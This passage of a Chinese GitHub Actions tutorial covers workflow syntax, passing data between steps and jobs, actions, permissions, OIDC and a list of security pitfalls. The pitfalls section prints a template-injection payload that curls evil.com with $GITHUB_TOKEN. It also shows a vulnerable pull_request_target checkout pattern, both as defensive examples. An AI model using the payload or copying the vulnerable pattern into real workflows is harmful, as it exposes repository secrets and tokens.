| `cache-mode` | 缓存能力 | `read` / `write` / `write-only` / `none` |

**`concurrency` 是个人项目最实用、却最少被用的字段：**

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

含义：同一个 workflow 在同一个分支上，**新的一次运行会取消还在跑的旧运行**。文档快速迭代时非常有用——连续推三次，只有最后一次跑完，前两次自动取消，省时间也省钱。

几个细节：
- `group` 名称**大小写不敏感**（`${{ github.ref }}` 里 `refs/heads/Main` 和 `main` 是同一组）。
- 排队顺序按"开始等待的时间"先进先出，但**不保证严格顺序**。
- `cancel-in-progress` 可以写表达式。
- 新增的 `queue:` 字段：`single`（默认，只保留 1 个待运行）或 `max`（最多 100 个待运行）。**它与 `cancel-in-progress: true` 冲突**，同时写会直接报校验错误。

### 6.3 job 层字段

```yaml
jobs:
  build:
    name: 构建产物                      # 显示名（可用表达式）
    runs-on: ubuntu-latest
    needs: [lint, test]                # 依赖（形成 DAG）
    if: ${{ github.event_name == 'push' }}
    timeout-minutes: 30
    concurrency:                       # job 级并发控制
      group: build-${{ github.ref }}
    continue-on-error: ${{ matrix.experimental }}
    environment:                       # 关联环境（可用环境级 secrets + 审批）
      name: production
      url: https://codis.fun/yj-knowledge-bank
    outputs:                           # 输出给下游 job
      version: ${{ steps.meta.outputs.version }}
    env:
      BUILD_MODE: release
    strategy:
      fail-fast: false
      max-parallel: 4
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [20, 22, 24]
        exclude:
          - os: windows-latest
            node: 20
        include:                       # include 在 exclude 之后处理
          - os: ubuntu-latest
            node: 24
            experimental: true
    services:                          # 伴随的服务容器（数据库等）
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
        ports: ['5432:5432']
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    container:                         # 在容器里跑所有 step
      image: node:22-bookworm
    steps: [ ... ]
```

**matrix 的展开过程**（对应上面配置）：

```
os × node 全组合（2 × 3 = 6 个）：
  ubuntu + 20     ubuntu + 22     ubuntu + 24
  windows + 20    windows + 22    windows + 24

exclude 移除：
  windows + 20                                  ← 剩 5 个

include 追加（在 exclude 之后）：
  ubuntu + 24 + experimental:true   ← 与已有组合合并，不是新增
  （若 include 写的是 os: macos-latest，则新增第 6 个组合）

最终 5 个 job 并行执行，每个 job 拿到一组 matrix 值
```

**matrix 的三个要点：**

1. **上限 256 个 job / 每次 workflow run**。`os: [ubuntu, windows, macos] × node: [18,20,22,24] × db: [pg,mysql] = 24`，注意别让组合数失控。
2. **`exclude` 是部分匹配**。只写 `node: 20` 会排除所有 node 为 20 的组合。
3. **`include` 后处理**。所以它能"撤销"一个 exclude，也能给已存在的组合追加字段。

**job 的执行顺序由 `needs` 决定：**

```
        ┌─────────┐
        │  lint   │
        └────┬────┘
             │
   ┌─────────┴─────────┐
   ▼                   ▼
┌──────┐           ┌──────┐
│ test │           │build │      ← test 和 build 并行（互不依赖）
└───┬──┘           └───┬──┘
    └────────┬────────┘
             ▼
        ┌─────────┐
        │ deploy  │  needs: [test, build]
        └─────────┘
```

### 6.4 step 层字段

```yaml
steps:
  - name: 检出代码
    uses: actions/checkout@v7
    with:
      fetch-depth: 0                   # 取全部历史（打 tag/生成 release notes 需要）
      persist-credentials: false       # 不把 token 写进 git config（安全加固）

  - name: 装依赖
    run: npm ci
    working-directory: ./web          # ✅ 正确做法：指定目录而不是 cd
    shell: bash                        # bash / pwsh / python / sh / cmd
    env:
      NPM_CONFIG_REGISTRY: https://registry.npmmirror.com
    timeout-minutes: 10
    continue-on-error: true            # 失败了也继续后面的 step

  - name: 读取上一步的输出
    id: read                          # 有 id 才能被 steps.<id>.outputs 引用
    run: echo "ok"
```

**关于 `shell`**：在 Linux/macOS 上默认是 `bash -e {0}`（`-e` 表示任一命令失败就整体失败）；Windows 默认是 `pwsh`。如果写 `shell: bash`，在 Windows 上会用一个特殊的 Git Bash 包装——行为与 Linux 的 bash 仍有差异，跨平台脚本要小心。

### 6.5 表达式与上下文

`${{ }}` 里的东西叫**上下文（context）**，一共 12 个：

| 上下文 | 内容 | 典型用法 |
|--------|------|----------|
| `github` | 事件与仓库信息 | `github.sha`、`github.ref_name`、`github.event_name`、`github.event.pull_request.number` |
| `env` | 环境变量 | `env.NODE_VERSION` |
| `vars` | 仓库/组织级变量（非密） | `vars.DEPLOY_HOST` |
| `secrets` | 加密的秘密 | `secrets.SSH_KEY` |
| `job` | 当前 job 状态 | `job.status` |
| `jobs` | reusable workflow 的输出 | `jobs.<id>.outputs.x` |
| `steps` | 前面 step 的输出 | `steps.meta.outputs.version` |
| `runner` | 当前 runner 信息 | `runner.os`、`runner.temp`、`runner.debug` |
| `strategy` | matrix 状态 | `strategy.job-index` |
| `matrix` | 当前矩阵值 | `matrix.node` |
| `needs` | 上游 job 的输出与结果 | `needs.build.outputs.version` |
| `inputs` | `workflow_dispatch` / `workflow_call` 的输入 | `inputs.environment` |

**常用函数：**

```yaml
${{ contains(github.event.head_commit.message, '[skip ci]') }}
${{ startsWith(github.ref, 'refs/tags/v') }}
${{ endsWith(github.ref, '/main') }}
${{ format('{0}-{1}', matrix.os, matrix.node) }}
${{ join(matrix.node, ', ') }}
${{ toJSON(github.event) }}
${{ fromJSON(needs.build.outputs.matrix) }}
${{ hashFiles('**/package-lock.json') }}
```

几个细节：
- `contains()` **大小写不敏感**，且能用于数组和子串。
- 表达式里的字符串**只能用单引号**，双引号会报错；字符串内的单引号用两个连写转义：`'It''s ok'`。
- 比较运算符的类型转换很松散：`null` → 0，`true` → 1，空字符串 → 0，数组/对象 → NaN（任何与 NaN 的比较都是 false）。**不要依赖隐式类型转换做数值比较。**
- 访问不存在的属性返回**空字符串**，不报错——这既是便利也是 bug 来源。
- 判断多事件的标准写法：`contains(fromJSON('["push","pull_request"]'), github.event_name)`
- 新增的 `case()` 函数：`case(条件1, 值1, 条件2, 值2, 默认值)`，第一个匹配的条件生效。

**状态函数与 `if` 的坑：**

```yaml
steps:
  - run: echo "总是执行"
    if: ${{ always() }}

  - run: echo "只在前面失败时执行"
    if: ${{ failure() }}

  - run: echo "只在前面的 step 成功时执行"
    if: ${{ success() }}

  - run: echo "任务被取消时执行"
    if: ${{ cancelled() }}

  - run: echo "tag 推送时执行"
    if: ${{ !startsWith(github.ref, 'refs/tags/') }}   # ← ! 必须包在 ${{ }} 里
```

> [!warning] `if` 的四个坑
> 1. **条件以 `!` 开头时必须写 `${{ }}`**。YAML 里 `!` 是标签语法，裸写 `if: !startsWith(...)` 会解析失败。写成 `if: ${{ !startsWith(...) }}` 或加括号 `if: (!startsWith(...))`。
> 2. **secrets 不能直接在 `if` 里比较**。正确做法是先赋给 job 级 `env`，再判断 `env.TOKEN != ''`。
> 3. **不写状态函数时，隐含一个 `success()`**。所以 `if: github.ref == 'refs/heads/main'` 在前序失败时不会执行——想让它执行得显式加上 `&& !failure()`。
> 4. **`always()` 慎用**。官方文档现在明确警告：用在关键失败处理上可能让 workflow 挂到超时。推荐用 `if: ${{ !cancelled() }}` 代替。

`needs.<job>.result` 的四个取值，用来做 job 级分支：

```yaml
jobs:
  deploy:
    needs: [build, test]
    if: ${{ needs.build.result == 'success' && needs.test.result == 'success' }}
```

| 值 | 含义 |
|----|------|
| `success` | 成功 |
| `failure` | 失败 |
| `cancelled` | 被取消 |
| `skipped` | 因 `if` 条件不满足而跳过 |

### 6.6 Step 之间怎么传数据：四个 `GITHUB_*` 文件

这是新手最容易出错、老教程最容易过时的地方。

**核心事实：每个 `run` 是一个独立的 shell 进程，互相之间不继承任何环境。**

那怎么传？GitHub 给每个 step 准备了一组**临时文件**，你把内容写进去，runner 会在 step 结束后读取并生效。路径存在同名的环境变量里：

| 文件（环境变量） | 作用 | 生效范围 | 读取方式 |
|------------------|------|----------|----------|
| `$GITHUB_OUTPUT` | 定义 step 的输出 | 通过 `steps.<id>.outputs.<name>` | 后续 step 显式引用 |
| `$GITHUB_ENV` | 设置环境变量 | 后续**所有** step | `$VAR` / `${{ env.VAR }}` |
| `$GITHUB_PATH` | 追加 PATH | 后续所有 step | 直接调用命令 |
| `$GITHUB_STEP_SUMMARY` | Markdown 摘要 | 无（展示用） | 运行页面上可见 |

**用法示例：**

```yaml
steps:
  - name: 生成版本号
    id: meta
    run: |
      VERSION="v$(date +%Y.%m.%d)-${GITHUB_SHA::7}"
      echo "version=$VERSION" >> "$GITHUB_OUTPUT"     # ← step 输出
      echo "BUILD_TIME=$(date -u +%FT%TZ)" >> "$GITHUB_ENV"   # ← 环境变量

  - name: 使用
    run: |
      echo "版本：${{ steps.meta.outputs.version }}"
      echo "构建时间：$BUILD_TIME"                     # ← 直接当环境变量用

  - name: 把自定义工具加进 PATH
    run: echo "$HOME/.local/bin" >> "$GITHUB_PATH"

  - name: 写一个漂亮的运行摘要
    run: |
      {
        echo "## 构建结果"
        echo ""
        echo "| 项目 | 值 |"
        echo "|------|-----|"
        echo "| 版本 | ${{ steps.meta.outputs.version }} |"
        echo "| 提交 | \`${GITHUB_SHA::7}\` |"
      } >> "$GITHUB_STEP_SUMMARY"
```

**注意事项：**

- 文件必须是 **UTF-8**，多条命令用换行分隔。
- `$GITHUB_ENV` **不能设置 `NODE_OPTIONS`**（这是刻意的安全限制，防止注入加载任意模块）。
- `$GITHUB_STEP_SUMMARY` 每个 step 上限 **1 MiB**，一个 job 最多渲染 **20 个** summary。
- 新增的 `$GITHUB_ARTIFACTS` / `$GITHUB_ARTIFACTS_LIST` 可以用来声明产物（支持文件路径和 OCI 镜像 digest），单 job 上限 500 个。

> [!danger] 如果你在网上抄到 `::set-output`，那是废弃语法
> 老教程里常见的这三种写法**已经被彻底移除**：
> ```
> echo "::set-output name=foo::bar"     ❌ 已移除
> echo "::set-env name=FOO::bar"        ❌ 已移除
> echo "::add-path::/some/path"         ❌ 已移除
> ```
> 正确写法是写进 `$GITHUB_OUTPUT` / `$GITHUB_ENV` / `$GITHUB_PATH` 文件。仍然可用的 `::` 命令只剩：`::debug::`、`::notice::`、`::warning::`、`::error::`、`::group::` / `::endgroup::`、`::add-mask::`、`::stop-commands::` / `::resume-commands::`。

### 6.7 Job 之间怎么传数据

job 之间是隔离的机器，传数据只有两条路：**outputs**（小数据）和 **artifacts**（文件）。

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}     # 把 step 输出提升为 job 输出
      version: ${{ steps.meta.outputs.version }}
    steps:
      - id: meta
        run: echo "version=v1.2.3" >> "$GITHUB_OUTPUT"
      - id: set-matrix
        run: |
          echo 'matrix={"include":[{"project":"web","config":"Release"},{"project":"api","config":"Debug"}]}' >> "$GITHUB_OUTPUT"

  build:
    needs: setup
    runs-on: ubuntu-latest
    strategy:
      matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}   # ← 动态矩阵
    steps:
      - run: echo "构建 ${{ matrix.project }} (${{ matrix.config }})，版本 ${{ needs.setup.outputs.version }}"
```

**关键细节：`steps.<id>.outputs.<name>` 的值**永远是字符串**。** 想传数字或布尔值，必须用 `fromJSON()` 转换——上面的动态矩阵就是这个套路的典型用法。

### 6.8 新语法：后台步骤与并行步骤

近期加入的能力，用于在一个 job 内并发执行：

```yaml
steps:
  - id: dev-server            # 必须有 id，才能被下面的 wait 引用
    name: 启动开发服务器
    run: npm run dev
    background: true          # 后台运行，不阻塞后续步骤

  - name: 等服务就绪后跑 E2E
    wait:                     # 本步骤执行前，先等这些后台步骤就绪
      - dev-server
    run: npx playwright test
```

- `background: true` 可以加在 `run` 或 `uses` 步骤上，**每个 job 最多 10 个并发后台步骤**，超出的排队。
- 后台步骤的输出和环境变量**只有在 `wait` / `wait-all` 之后才可见**。
- 后台步骤失败时，job 会在下一个覆盖它的 `wait` / `wait-all` 处失败。
- job 结束前有一个隐式的 `wait-all`。
- `wait` **不支持 `if`**，也不能用在 composite action 内部。

---

## 七、Action：可复用的构建块

`uses:` 引用的东西就是 action。理解它的三种形态，你就能判断"该抄哪个"以及"该不该自己写"。

### 7.1 三种类型

| 类型 | 定义文件 | 运行方式 | 启动速度 | 平台支持 | 适用场景 |
|------|----------|----------|----------|----------|----------|
| **JavaScript action** | `action.yml` + `runs.using: node24` | runner 上的 Node 直接执行 | 快（毫秒级） | 全平台 | 调 API、处理文件、轻量逻辑 |
| **Docker container action** | `action.yml` + `runs.using: docker` | 拉镜像 → 起容器 → 执行 | 慢（拉镜像） | **仅 Linux** | 需要特定工具链/系统依赖 |
| **Composite action** | `action.yml` + `runs.using: composite` | 把一串 step 组合起来 | 无额外开销 | 全平台 | 把重复的步骤序列封装成一步 |

**JavaScript action 的结构：**

```yaml
# action.yml
name: 'My Action'
runs:
  using: 'node24'      # 或 node20
  main: 'dist/index.js'
  pre: 'dist/setup.js'         # 可选：job 开始前执行
  pre-if: 'always()'
  post: 'dist/cleanup.js'      # 可选：job 结束后执行（即使失败也跑）
  post-if: 'always()'
```

JS action 通常要用 `@vercel/ncc` 把依赖打包进 `dist/`——因为 runner 不会给你 `npm install`。

**Docker action 的结构：**

```yaml
runs:
  using: 'docker'
  image: 'Dockerfile'          # 或 docker://alpine:3.20
  args:
    - ${{ inputs.who-to-greet }}
  env:
    FOO: bar
  entrypoint: /entrypoint.sh
```

注意 `with.args` 和 `with.entrypoint` 在 workflow 里可以被覆盖。

**Composite action 的结构（最实用的自建形态）：**

```yaml
# .github/actions/deploy/action.yml
name: '部署到服务器'
description: '把构建产物同步到目标机器并重启服务'

inputs:
  host:
    description: '目标主机'
    required: true
  user:
    description: 'SSH 用户'
    required: false
    default: 'deploy'
  source:
    description: '要同步的目录'
    required: true
    default: './dist'

outputs:
  deployed-sha:
    description: '部署的 commit SHA'
    value: ${{ steps.deploy.outputs.sha }}    # composite 的 output 必须有 value

runs:
  using: 'composite'
  steps:
    - name: 准备 SSH 密钥
      shell: bash                            # ← composite 里每个 step 必须显式写 shell
      run: |
        mkdir -p ~/.ssh
        echo "${{ inputs.ssh-key }}" > ~/.ssh/id_ed25519
        chmod 600 ~/.ssh/id_ed25519
        ssh-keyscan -H ${{ inputs.host }} >> ~/.ssh/known_hosts 2>/dev/null

    - name: 同步文件
      shell: bash
      run: |
        rsync -az --delete \
          -e "ssh -i ~/.ssh/id_ed25519 -o StrictHostKeyChecking=yes" \
          "${{ inputs.source }}/" \
          "${{ inputs.user }}@${{ inputs.host }}:/srv/app/"

    - id: deploy
      name: 重启服务
      shell: bash
      run: |
        ssh -i ~/.ssh/id_ed25519 "${{ inputs.user }}@${{ inputs.host }}" \
          "sudo systemctl restart app"
        echo "sha=${GITHUB_SHA}" >> "$GITHUB_OUTPUT"
```

使用时：

```yaml
steps:
  - uses: actions/checkout@v7
  - uses: ./.github/actions/deploy            # ← 本地 action 用相对路径
    with:
      host: ${{ vars.DEPLOY_HOST }}
      source: ./dist
```

### 7.2 `uses:` 的三种来源

```yaml
- uses: actions/checkout@v7                      # ① 官方 action（github/actions 组织下）
- uses: docker/build-push-action@v7              # ② 第三方公开 action（owner/repo@ref）
- uses: ./.github/actions/my-composite           # ③ 仓库内的本地 action
```

① 和 ② 是"下载别人的代码并在你的 job 里执行"。这就引出了下一个问题。

### 7.3 版本固定的安全问题

`@v7` 这样的**浮动 tag 是可以被移动的**。action 的作者（或任何拿到该仓库写权限的人/攻击者）可以把 `v7` 这个 tag 指向完全不同的代码。你的 workflow 什么都没改，但下次运行执行的已经是另一份代码——而它带着你的 `GITHUB_TOKEN` 和所有 secrets。

```
@v7                    → 移动 tag，方便，但内容可变
@v7.0.1                → 精确 tag，仍然可以被删除后重建
@3d3c42e5aac5...（40 位 SHA） → 内容不可变（Git 对象寻址天然防篡改）
```

真实世界里这类攻击发生过：`tj-actions/changed-files` 被入侵后，攻击者修改了已有的 tag 指向恶意提交，导致大量下游仓库的 secrets 被打印到公开日志里。

> [!important] 安全实践
> **第三方 action 一律用完整 40 位 commit SHA 固定。** 官方文档的原话是：SHA 固定"是目前唯一把 action 当作不可变发布来使用的方式"。
>
> 代价是升级很麻烦——用 Dependabot 解决。在 `.github/dependabot.yml` 里配置：
> ```yaml
> version: 2
> updates:
>   - package-ecosystem: "github-actions"
>     directory: "/"
>     schedule:
>       interval: "weekly"
> ```
> Dependabot 会发现新版本并提 PR——**注意它会把 SHA 更新成新版本的 SHA 并保留注释里的版本号**，既有安全性又不用手动维护。

| 类型 | 建议 |
|------|------|
| 官方 `actions/*` | `@vN` 可以接受（GitHub 自己维护，风险低） |
| 高星第三方（`docker/*`、`softprops/*` 等） | 至少 `@vN`，重要项目建议 pin SHA |
| 冷门第三方 / 个人仓库 | **必须 pin SHA** |
| 内部自建 action | 直接放仓库里用相对路径，无外部依赖 |

### 7.4 静态检查工具

两个当前活跃的工具值得加进流水线：

| 工具 | 语言 | 作用 |
|------|------|------|
| **actionlint** | Go，v1.7.12 | 语法校验、shellcheck 集成、表达式类型检查 |
| **zizmor** | Rust | 安全审计：模板注入、凭证残留、权限过大、未 pin 的 action、危险触发器等，支持 SARIF 输出 |

```yaml
- name: 检查 workflow 语法
  run: |
    bash <(curl -sSf https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)
    ./actionlint -color
```

---

## 八、身份、密钥与权限

前四章回答了"什么时候跑/在哪跑/跑什么/产物去哪"。这一章回答第五个问题：**流水线用什么身份去访问外部系统。**

### 8.1 `GITHUB_TOKEN` 到底是什么

大多数人把它当成一个普通的环境变量，但它其实是一个**完整生命周期管理的凭证**：

```
每个 job 开始前
      │
      ▼
GitHub 为该仓库上的 "GitHub Actions" App 签发一个
      Installation Access Token
      │
      ├─ 作用域：仅限当前仓库（拿到别的仓库没用）
      ├─ 权限：由 permissions: 决定（见 8.2）
      ├─ 生命周期：job 结束即失效
      │   （托管 runner 最长 6 小时；自建 runner 最长 24 小时）
      └─ 注入方式：环境变量 + github.token 上下文
      │
      ▼
job 结束 → token 立即失效，即使被打印到日志也没用了
```

**这解释了为什么 `GITHUB_TOKEN` 比 PAT 安全得多**：它是一个短命的、作用域受限的令牌，而不是一个长期有效的万能钥匙。

**一个反直觉的行为**：用 `GITHUB_TOKEN` 提交代码**不会触发新的 workflow 运行**（这是防止无限递归的保护）。例外有两个：`workflow_dispatch` 和 `repository_dispatch` 永远会触发；用 `GITHUB_TOKEN` 创建/更新的 `pull_request` 会创建运行，但处于**需要审批**的状态。

### 8.2 `permissions:`：最小权限

```yaml
# 以下四种写法任选其一（同一个 permissions 块里只能选一种形式）

permissions: {}                       # 什么权限都不给（最严格）
permissions: read-all                 # 全部只读
permissions: write-all                # 全部可写（强烈不推荐）
permissions:
  contents: read                      # 只读代码
  pull-requests: write                # 可以评论 PR
  id-token: write                     # 换取 OIDC token（见 8.4）
```

可用的 scope：

| Scope | 可取值 | 典型用途 |
|-------|--------|----------|
| `contents` | read/write | 读代码、创建 release、推 tag |
| `pull-requests` | read/write | 评论/打标签 PR |
| `issues` | read/write | 管理 issue |
| `packages` | read/write | 推镜像到 GHCR |
| `deployments` | read/write | 创建部署记录 |
| `pages` | read/write | 发布 GitHub Pages |
| `checks` | read/write | 管理检查结果 |
| `statuses` | read/write | 提交 commit status |
| `id-token` | **write/none** | OIDC（没有 read 这个值） |
| `attestations` | read/write | 产物证明 |
| `security-events` | read/write | 上传 code scanning 结果 |
| `actions` | read/write | 管理 workflow run |
| `discussions` | read/write | 管理 discussion |
| `vulnerability-alerts` | **read/none** | 读漏洞告警 |

> [!warning] 最容易被忽略的一条规则
> **只要显式列出了任何一个 scope，没列出的 scope 全部变成 `none`。**
>
> ```yaml
> permissions:
>   contents: read       # ← 这一行意味着 pull-requests、issues 等全部变成 none
> ```
> 这就是很多人写完 `permissions` 之后"PR 评论突然失败了"的原因。反过来，正确地用它能让 token 的权限收缩到刚好够用——**这是性价比最高的一条安全加固。**

权限的解析顺序（后者覆盖前者）：

```
企业/组织/仓库默认 → workflow 级 permissions: → job 级 permissions:
                                                      │
                                    fork PR 特殊处理：任何 write 被降级为 read
                                    （除非仓库开启了 "Send write tokens to workflows from pull requests"）
```

### 8.3 Secrets、Variables 与 Environments

| 机制 | 用途 | 是否加密 | 日志中 | 作用域 |
|------|------|----------|--------|--------|
| **Secrets** | 密钥、密码、token | ✅ 加密存储 | 自动打码 `***` | 仓库 / 组织 / 环境 |
| **Variables** | 非敏感配置（域名、区域） | ❌ 明文 | 原样显示 | 仓库 / 组织 / 环境 |
| **Environments** | 部署目标（含审批与保护规则） | — | — | 引用它的 job |

**Environments 是"部署审批"的实现方式：**

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://codis.fun/yj-knowledge-bank
    steps:
      - run: ./deploy.sh
```

在仓库 Settings → Environments 里给 `production` 配置：

| 保护规则 | 说明 |
|----------|------|
| **Required reviewers** | 最多 6 个用户/团队，**任意一人批准即可**；可勾选"禁止自我批准" |
| **Wait timer** | 1 ~ 43200 分钟（最多 30 天），等待期间**不计费** |
| **Deployment branches** | 限制哪些分支/tag 能部署（通配符不跨 `/`） |

> [!note] Environments 的免费额度限制
> 在 Free / Pro / Team 套餐下，**环境审批只对公开仓库可用**。私有仓库要享受这个能力需要 Enterprise。另外，默认情况下管理员可以绕过保护规则（可配置关闭）。

**Secrets 的打码机制**：GitHub 会扫描日志，把与 secrets 值匹配的内容替换成 `***`。但这是**字符串匹配**，所以：
- 如果 secret 被 base64 编码、被拆分成多行、或作为子串嵌入，就打不掉了
- 手动打码用 `echo "::add-mask::$VALUE"`
- 生成的值需要跨 job 传递时，官方文档给出了一套"先 mask 再写入 output"的模式

### 8.4 OIDC：不用长期密钥上云

**问题**：部署到 AWS / GCP / Azure 时，传统做法是把云厂商的长期 Access Key 存进 GitHub Secrets。这个密钥长期有效、权限往往过大、轮转麻烦，一旦泄漏后果严重。

**解法**：OIDC（OpenID Connect）让每次运行**临时换取**一个短期凭证。

```
GitHub Actions                        云厂商 (AWS/GCP/Azure)
      │                                        │
      │ ① job 声明 id-token: write              │
      │                                        │
      │ ② runner 向 GitHub 的 OIDC provider      │
      │    请求一个 JWT                          │
      │    签发者: token.actions.githubusercontent.com
      │    载荷 sub: repo:OWNER/REPO:ref:refs/heads/main
      │                                        │
      │ ③ 把这个 JWT 交给云厂商的 STS ───────────►│
      │                                        │ ④ 校验签名（GitHub 的公钥）
      │                                        │    校验 sub claim 是否符合
      │                                        │    你预先配置的信任策略
      │ ◄──── ⑤ 返回临时凭证（有效期通常 1 小时）─│
      │                                        │
      │ ⑥ 用临时凭证部署，过期自动失效            │
```

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write      # 必须：换取 JWT
      contents: read
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: ap-northeast-1
      - run: aws s3 sync ./dist s3://my-bucket/
```

云端信任策略里最关键的是 `sub` claim 的格式：

| `sub` 格式 | 适用场景 |
|------------|----------|
| `repo:OWNER/REPO:ref:refs/heads/main` | 只允许 main 分支部署（最常用） |
| `repo:OWNER/REPO:environment:production` | 只允许 production 环境部署 |
| `repo:OWNER/REPO:pull_request` | PR 场景（**危险，不要给部署权限**） |
| `repo:OWNER/REPO:ref:refs/tags/v*` | 只允许 tag 发布 |

> [!danger] 2026 年的一个破坏性变更
> **2026-07-15 之后创建（或重命名/转移）的仓库，OIDC 的 `sub` claim 会带上不可变的数字 ID**：
> ```
> repo:OWNER@<OWNER_ID>/REPO@<REPO_ID>:ref:refs/heads/main
> ```
> 老仓库可以按组织/仓库选择性启用。
>
> **如果你的云厂商信任策略是按旧格式写的，这些仓库的部署会全部失败。** 迁移期建议在信任策略里同时匹配两种格式（或用 `StringLike` 通配）。这是当前最容易踩的 OIDC 坑。

**不用密钥的包发布（Trusted Publishing）**：同样的机制也被用在了包管理器的发布流程上。

| 平台 | 是否支持 | 要点 |
|------|----------|------|
| **PyPI** | ✅ 官方文档完善 | 在 PyPI 注册仓库 + workflow 文件名（可选环境），job 给 `id-token: write`，用 `pypa/gh-action-pypi-publish` 且**不传** username/password |
| **npm** | ✅ 存在（2025 年中起） | 要求 **npm CLI ≥ 11.5.1**、**仅 GitHub 托管 runner**（不支持自建）、环境名**大小写敏感**匹配；具体细节以 npm 官方文档为准 |

### 8.5 安全陷阱清单

这一节是全文最该反复看的部分。

#### 陷阱一：`pull_request_target` + checkout PR 代码 = 泄密

这是 GitHub Actions 上最经典的漏洞模式（业内叫 "pwn request"）。

```yaml
# ❌ 危险写法
on: pull_request_target            # workflow 文件取自受信任的默认分支
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← 检出了攻击者的代码
      - run: npm install                                     # ← 执行了攻击者的代码
```

**为什么危险**：`pull_request_target` 的设计目的是"对 PR 做元数据操作"（打标签、发评论），因此它能拿到 secrets 和可写 token。而上面这段代码又 checkout 了 fork 的代码并执行——攻击者只要在 PR 里改一下 `package.json` 的 `postinstall` 脚本，你的 secrets 就是他的了。

```
受信任的 workflow 文件  +  不可信的代码  +  高权限凭证  =  漏洞
        ↑                      ↑                  ↑
   （正常）            （攻击者控制）        （pull_request_target 给的）
```

**正确的做法**：

```yaml
# ✅ 方案 A：需要执行 PR 代码 → 用 pull_request（无 secrets）
on: pull_request
permissions:
  contents: read

# ✅ 方案 B：需要 secrets 又要执行 PR 代码 → 两段式
#    第一段 pull_request 跑构建（无 secrets），把产物上传为 artifact
#    第二段 workflow_run 下载 artifact 并部署（有 secrets，但不执行 PR 代码）
```

**平台层面的兜底（2026 年新增）**：

| 措施 | 状态 |
|------|------|
| 公开仓库默认策略**阻断** `pull_request_target` | 目前处于 evaluate 模式，**2026-11-02 起强制** |
| `actions/checkout@v7` 在 `pull_request_target` / `workflow_run` 下**拒绝**检出 fork 的 head | 已生效；需要显式传 `allow-unsafe-pr-checkout: true` 才能绕过 |

#### 陷阱二：脚本注入（模板注入）

```yaml
# ❌ 危险：把不可信内容直接插进 shell 脚本
- run: echo "标题是 ${{ github.event.issue.title }}"
```

如果 issue 标题是 `"; curl evil.com/steal?t=$GITHUB_TOKEN; echo "`，这段就变成了命令执行。

**正确做法**：把不可信内容放进 `env`，让 shell 从环境变量读——因为环境变量不会被重新解析成命令。

```yaml
# ✅ 安全
- run: echo "标题是 $TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}
```

**不可信输入的来源**包括：`github.event.issue.title/body`、`github.event.pull_request.title/body`、`github.event.comment.body`、`github.event.review.body`、`github.event.head_commit.message`、`github.head_ref`、以及任何来自 fork 的文件内容。zizmor 和 CodeQL 都能检出这类问题。

#### 陷阱三：给公开仓库挂 self-hosted runner

前面 5.4 已经说过，这里再强调一次：**这是最严重的错误**，因为它突破了 GitHub 的隔离边界，直接进到你的内网。

#### 陷阱四：缓存投毒

缓存是按分支作用域隔离的。低信任度的触发事件（`pull_request_target`、`issue_comment`、`workflow_run`）**默认对默认分支的缓存只读**——能恢复，但保存会失败（只给一个警告）。只有 `push`、`workflow_dispatch`、`repository_dispatch`、`schedule` 等可信事件才能写入默认分支的缓存作用域。

如果显式写 `cache-mode: write` 去绕过这个保护，风险就回来了。

#### 陷阱五：`workflow_run` 的产物不可信

`workflow_run` 触发的工作流**自带 secrets 和可写 token**（即使上游 workflow 没有）。如果上游是 fork 的 `pull_request` 运行，它上传的 artifact 必须当作**不可信输入**对待——这是上面"方案 B"里唯一需要小心的地方。

#### 安全实践对照表

| 做法 | 风险 | 正确姿势 |
|------|------|----------|
| `uses: owner/repo@v1` | tag 可被移动 | pin 到 40 位 SHA + Dependabot |
| 不写 `permissions:` | 继承仓库默认，可能过大 | 显式 `contents: read` 起手 |
| `${{ github.event.*.body }}` 插进 `run` | 命令注入 | 放进 `env` 再引用 |
| `pull_request_target` + checkout PR | 泄密 | 用 `pull_request`，或两段式 + 人工审批 |
| `secrets` 写死在 workflow 里 | 明文泄漏 | 用 Secrets / OIDC |
| 自建 runner 挂在公开仓库 | 内网沦陷 | 只给私有仓库用，或严格限制触发者 |
| 长期云凭证存 Secrets | 泄漏后长期有效 | 用 OIDC 换临时凭证 |
| `actions/checkout` 默认 `persist-credentials: true` | token 残留在 git config | 不需要推送时设为 `false` |
| 部署无审批 | 误操作直接影响生产 | 用 Environment + Required reviewers |

---

## 九、缓存与产物

这是两个经常被混淆的概念，但它们的**设计目的完全相反**。

### 9.1 本质区别

| | **Cache** | **Artifact** |
|--|-----------|--------------|
| **目的** | 加速——避免重复下载/编译 | 保存和传递——把结果留下来 |
| **典型内容** | `node_modules/`、`~/.m2`、`~/.cargo`、编译中间产物 | 构建出的二进制、日志、测试报告、要发布的包 |
| **可变性** | 同 key 已存在则不会覆盖 | v4 起**不可变** |
| **命中方式** | key 精确匹配 → restore-keys 前缀回退 | 按名字精确取 |
| **作用域** | 分支隔离 | 同一次 run 内所有 job |
| **保留策略** | 7 天未使用自动淘汰；默认每仓库 10 GB | 默认 90 天（公开仓库可设 1–90 天；私有 1–400 天） |
| **失败影响** | 缓存未命中只是变慢，不影响正确性 | 缺失会导致下游 job 失败 |
| **能否跨 run** | ✅ 能 | ❌ 只能在同一次 run 内传递（或用 API 下载） |

> [!tip] 一句话判断
> **"丢了只是变慢"的用 cache；"丢了就错了"的用 artifact。**

### 9.2 缓存的匹配机制

```yaml
- uses: actions/cache@v6
  with:
    path: |
      ~/.npm
      ~/.cache/pip
    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-node-
```

匹配逻辑分两级：

```
① 精确匹配 key
